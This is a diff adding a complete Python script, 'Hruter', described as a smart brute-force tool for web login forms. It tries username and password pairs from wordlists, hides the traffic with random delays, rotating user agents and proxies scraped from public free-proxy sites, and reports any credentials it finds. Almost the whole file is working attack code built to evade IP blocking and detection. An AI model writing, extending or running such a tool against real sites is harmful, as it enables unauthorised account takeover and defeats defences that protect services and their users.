@@ -1,0 +1,373 @@
+#!/usr/bin/env python3
+"""
+Hruter - Smart Brute Force Tool v1.1
+Avoids IP blocking through random timing and automatic proxy rotation.
+Supports dual wordlists (usernames and passwords) and CLI-first control.
+"""
+
+import requests
+import time
+import random
+import json
+import argparse
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from urllib.parse import urljoin
+import logging
+from typing import List, Dict, Optional, Tuple, Set
+import threading
+import sys
+import re
+import os
+
+# Configure logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler('bruteforce.log'),
+        logging.StreamHandler()
+    ]
+)
+logger = logging.getLogger(__name__)
+
+class ProxyManager:
+    """Manages automatic proxy fetching, validation, and rotation"""
+    def __init__(self, rotate_interval: int = 0, custom_proxies: Optional[List[str]] = None):
+        self.rotate_interval = rotate_interval
+        self.proxies: List[str] = custom_proxies if custom_proxies else []
+        self.current_proxy_index = 0
+        self.lock = threading.Lock()
+        self.stop_rotation = threading.Event()
+        self.last_fetch_time: float = 0.0
+        
+        if not self.proxies:
+            self.fetch_proxies()
+            
+        if self.rotate_interval > 0:
+            self.rotation_thread = threading.Thread(target=self._rotation_loop, daemon=True)
+            self.rotation_thread.start()
+
+    def fetch_proxies(self) -> List[str]:
+        """Fetch free proxies from multiple public sources"""
+        if time.time() - self.last_fetch_time < 300 and self.proxies:
+            return self.proxies
+
+        logger.info("Fetching free proxies for IP rotation...")
+        new_proxies = []
+        sources = [
+            "https://www.sslproxies.org/",
+            "https://free-proxy-list.net/",
+            "https://www.us-proxy.org/"
+        ]
+        
+        for url in sources:
+            try:
+                # Use a specific session for proxy fetching to avoid dependency on current proxy
+                response = requests.get(url, timeout=10)
+                matches = re.findall(r"\d+\.\d+\.\d+\.\d+:\d+", response.text)
+                new_proxies.extend(matches)
+            except Exception as e:
+                logger.debug(f"Failed to fetch from {url}: {e}")
+        
+        with self.lock:
+            unique_proxies = list(set(new_proxies + self.proxies))
+            if unique_proxies:
+                self.proxies = unique_proxies
+                self.last_fetch_time = time.time()
+                logger.info(f"Proxy pool updated: {len(self.proxies)} proxies available.")
+            else:
+                logger.warning("No proxies found. Attack will continue without IP rotation.")
+        
+        return self.proxies
+
+    def _rotation_loop(self):
+        """Background thread for timed IP rotation"""
+        while not self.stop_rotation.is_set():
+            time.sleep(self.rotate_interval)
+            with self.lock:
+                if self.proxies:
+                    self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
+                    logger.info(f"IP ROTATION: Switched to proxy {self.proxies[self.current_proxy_index]}")
+            
+            if time.time() - self.last_fetch_time > 1800: # Every 30 mins
+                self.fetch_proxies()
+
+    def get_proxy(self) -> Optional[Dict[str, str]]:
+        """Get the current active proxy in requests format"""
+        with self.lock:
+            if not self.proxies:
+                return None
+            proxy = self.proxies[self.current_proxy_index]
+            return {
+                'http': f"http://{proxy}",
+                'https': f"http://{proxy}"
+            }
+
+    def stop(self):
+        self.stop_rotation.set()
+
+class SmartBruteForcer:
+    def __init__(self, config: Dict, proxy_manager: Optional[ProxyManager] = None):
+        self.config = config
+        self.session = requests.Session()
+        self.proxy_manager = proxy_manager
+        self.lock = threading.Lock()
+        self.attempts = 0
+        self.successful = False
+        self.result = None
+        
+        if config.get('headers'):
+            self.session.headers.update(config['headers'])
+    
+    def get_random_delay(self) -> float:
+        """Generate random delay between requests to mimic human behavior"""
+        min_delay = float(self.config.get('min_delay', 1.0))
+        max_delay = float(self.config.get('max_delay', 5.0))
+        return random.uniform(min_delay, max_delay)
+    
+    def rotate_user_agent(self) -> str:
+        """Rotate user agent to avoid detection"""
+        user_agents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0'
+        ]
+        return random.choice(user_agents)
+    
+    def make_request(self, username: str, password: str) -> Tuple[bool, Dict]:
+        """Make a single authentication attempt"""
+        proxy = self.proxy_manager.get_proxy() if self.proxy_manager else None
+        user_agent = self.rotate_user_agent()
+        
+        data = self.config['payload_template'].copy()
+        data[self.config['username_field']] = username
+        data[self.config['password_field']] = password
+        
+        headers = self.session.headers.copy()
+        headers['User-Agent'] = user_agent
+        
+        try:
+            delay = self.get_random_delay()
+            time.sleep(delay)
+            
+            response = self.session.post(
+                self.config['target_url'],
+                data=data,
+                headers=headers,
+                proxies=proxy,
+                timeout=self.config.get('timeout', 30),
+                allow_redirects=self.config.get('allow_redirects', True)
+            )
+            
+            with self.lock:
+                self.attempts += 1
+                if self.attempts % 10 == 0:
+                    logger.info(f"Progress: {self.attempts} attempts made.")
+            
+            success_indicators = self.config.get('success_indicators', [])
+            failure_indicators = self.config.get('failure_indicators', [])
+            
+            for indicator in success_indicators:
+                if indicator in response.text:
+                    logger.info(f"SUCCESS! Credentials found -> {username}:{password}")
+                    return True, {
+                        'username': username,
+                        'password': password,
+                        'response': response.text[:200],
+                        'status_code': response.status_code
+                    }
+            
+            for indicator in failure_indicators:
+                if indicator in response.text:
+                    return False, {}
+            
+            # Success detection via status codes or redirection logic
+            if response.status_code in [301, 302, 303, 307, 308] or ('dashboard' in response.url.lower()):
+                 logger.info(f"SUCCESS! Redirection detected -> {username}:{password}")
+                 return True, {
+                        'username': username,
+                        'password': password,
+                        'url': response.url,
+                        'status_code': response.status_code
+                    }
+
+            return False, {}
+            
+        except requests.exceptions.RequestException as e:
+            logger.debug(f"Request error for {username}:{password}: {e}")
+            return False, {}
+    
+    def test_connection(self) -> bool:
+        """Test if the target is reachable"""
+        try:
+            response = self.session.get(
+                self.config['target_url'],
+                timeout=15
+            )
+            logger.info(f"Target reachable: {response.status_code}")
+            return True
+        except Exception as e:
+            logger.error(f"Target connection failed: {e}")
+            return False
+    
+    def bruteforce(self, usernames: List[str], passwords: List[str], max_workers: int = 3):
+        """Execute brute force attack across all combinations"""
+        if not self.test_connection():
+            return None
+        
+        with ThreadPoolExecutor(max_workers=max_workers) as executor:
+            futures = {}
+            for username in usernames:
+                if self.successful: break
+                for password in passwords:
+                    if self.successful: break
+                    future = executor.submit(self.make_request, username, password)
+                    futures[future] = (username, password)
+            
+            for future in as_completed(futures):
+                try:
+                    success, result = future.result()
+                    if success:
+                        with self.lock:
+                            self.successful = True
+                            self.result = result
+                        # Cancel remaining tasks
+                        for f in futures:
+                            if not f.done(): f.cancel()
+                        break
+                except Exception as e:
+                    logger.debug(f"Task failed: {e}")
+        
+        return self.result
+
+def load_list(path: str, label: str = "items") -> List[str]:
+    """Load items from a wordlist file"""
+    try:
+        if not path or not os.path.isfile(path):
+            return []
+        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
+            items = [line.strip() for line in f if line.strip()]
+        logger.info(f"Loaded {len(items)} {label} from {path}")
+        return items
+    except Exception as e:
+        logger.error(f"Error loading {path}: {e}")
+        return []
+
+def print_banner():
+    banner = r"""
+    \033[1;31m  _  _             _              
+    | || | _ _  _  _ | |_  ___  _ _ 
+    | __ || '_|| || ||  _|/ -_)| '_|
+    |_||_||_|   \_,_| \__|\___||_|  
+    \033[1;37m      Smart Brute Force Tool v1.1
+    \033[0m"""
+    print(banner)
+
+def get_cli_input():
+    """Interactive CLI prompts for configuration"""
+    print("=" * 60)
+    print("     HRUTER - INTERACTIVE MODE")
+    print("=" * 60)
+    
+    target_url = input("\n[1] Target login URL: ").strip()
+    user_input = input("[2] Username OR path to username list: ").strip()
+    pass_wordlist = input("[3] Path to password wordlist: ").strip()
+    
+    rotate_interval = int(input("\n[4] IP rotation interval (seconds, 0 to disable): ").strip() or "0")
+    threads = int(input("[5] Threads (default 3): ").strip() or "3")
+    
+    config = {
+        "target_url": target_url,
+        "username_field": "username",
+        "password_field": "password",
+        "payload_template": {"username": "", "password": "", "submit": "Login"},
+        "success_indicators": ["dashboard", "welcome"],
+        "failure_indicators": ["invalid", "error"],
+        "min_delay": 1.0,
+        "max_delay": 5.0,
+        "timeout": 30
+    }
+    
+    return {
+        'config': config,
+        'username': user_input if not os.path.isfile(user_input) else None,
+        'userlist': user_input if os.path.isfile(user_input) else None,
+        'wordlist': pass_wordlist,
+        'rotate_interval': rotate_interval,
+        'threads': threads
+    }
+
+def main():
+    print_banner()
+    parser = argparse.ArgumentParser(description='Hruter - Smart Brute Force Tool')
+    parser.add_argument('--cli', action='store_true', help='Interactive mode')
+    parser.add_argument('--url', help='Target URL')
+    parser.add_argument('-u', '--username', help='Single username')
+    parser.add_argument('-U', '--userlist', help='Username wordlist')
+    parser.add_argument('-w', '--wordlist', help='Password wordlist')
+    parser.add_argument('-r', '--rotate-interval', type=int, default=0, help='IP rotation (secs)')
+    parser.add_argument('-c', '--config', default='bruteforce_config.json', help='Config file')
+    parser.add_argument('-t', '--threads', type=int, default=3, help='Threads')
+    
+    args = parser.parse_args()
+    
+    # Load base config
+    config = {}
+    if os.path.exists(args.config):
+        try:
+            with open(args.config, 'r') as f:
+                config = json.load(f)
+        except: pass
+
+    if args.cli or (not (args.username or args.userlist) and not args.wordlist):
+        data = get_cli_input()
+        if not data: return
+        config.update(data['config'])
+        usernames = [data['username']] if data['username'] else load_list(data['userlist'], "usernames")
+        passwords = load_list(data['wordlist'], "passwords")
+        rotate_interval = data['rotate_interval']
+        threads = data['threads']
+    else:
+        if args.url: config['target_url'] = args.url
+        usernames = [args.username] if args.username else load_list(args.userlist, "usernames")
+        passwords = load_list(args.wordlist, "passwords")
+        rotate_interval = args.rotate_interval
+        threads = args.threads
+
+    if not usernames or not passwords or not config.get('target_url'):
+        logger.error("Missing required parameters (URL, Users, Passwords).")
+        return
+
+    proxy_manager = ProxyManager(rotate_interval=rotate_interval)
+    
+    print("\n" + "=" * 60)
+    print("     HRUTER - ATTACK SUMMARY")
+    print("=" * 60)
+    print(f"Target: {config['target_url']}")
+    print(f"Users : {len(usernames)}")
+    print(f"Passes: {len(passwords)}")
+    print(f"IP Rot: {rotate_interval}s" if rotate_interval > 0 else "IP Rot: Disabled")
+    print("=" * 60)
+    
+    if input("\n[!] Start attack? (y/N): ").lower() != 'y':
+        proxy_manager.stop()
+        return
+
+    brute_forcer = SmartBruteForcer(config, proxy_manager)
+    try:
+        result = brute_forcer.bruteforce(usernames, passwords, threads)
+        if result:
+            print(f"\n[+] CREDENTIALS FOUND: {result['username']}:{result['password']}")
+        else:
+            print("\n[-] No valid credentials found.")
+    finally:
+        proxy_manager.stop()
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n[!] Aborted.")
+        sys.exit(0)
